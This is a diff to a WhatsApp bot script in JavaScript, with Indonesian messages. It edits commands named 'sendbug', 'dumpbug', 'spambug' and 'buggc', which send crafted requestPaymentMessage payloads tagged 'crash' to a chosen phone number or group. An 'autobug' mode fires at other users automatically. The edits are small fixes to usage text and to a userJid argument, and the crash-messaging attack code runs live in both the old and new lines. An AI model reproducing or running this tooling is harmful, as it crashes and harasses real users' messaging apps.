@@ -56,7 +56,7 @@ semar.sendMessage(id, listMessage, options)}
 
 if (body.startsWith(`64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61`)) { 
 semar.relayMessage(from, { reactionMessage }, { messageId: "crash" })
-requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: msg.chat })
+requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
 semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })}
 
 if (autobug && !isOwner && !isCmd && !isGroup) { 
@@ -145,7 +145,7 @@ case 'sendbug':
 if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
 if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
-if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}|10`)
+if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
 if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
 if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
 if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
@@ -167,7 +167,7 @@ case 'dumpbug':
 if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
 if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}dumpbug ${senderNumber}`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}dumpbug ${senderNumber}`)
-if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}|10`)
+if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}dumpbug ${senderNumber}`)
 if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}dumpbug ${senderNumber}`)
 if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
 if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
@@ -178,10 +178,10 @@ break
 //©from: dennis × ivan × andik
 case 'spambug':
 if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
-if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}spambug ${senderNumber}|10`)
-if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}|10`)
-if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}|10`)
-if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}|10`)
+if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}spambug ${senderNumber}`)
+if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}`)
+if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}`)
+if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}`)
 if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
 if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
 reply('Loading...')
@@ -196,7 +196,7 @@ break
 case 'buggc':
 if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
-requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: msg.chat })
+requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
 semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
 await sleep(3000)
 await semar.groupLeave(from)
@@ -232,7 +232,7 @@ case 'chat':
 if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 if (!dn) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}chat ${senderNumber}|halo`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}chat ${senderNumber}|halo`)
-if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}|10`)
+if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}chat ${senderNumber}|halo`)
 if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}chat ${senderNumber}|halo`)
 if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim pesan ke nomor ini!')
 nd = dn.split("|")
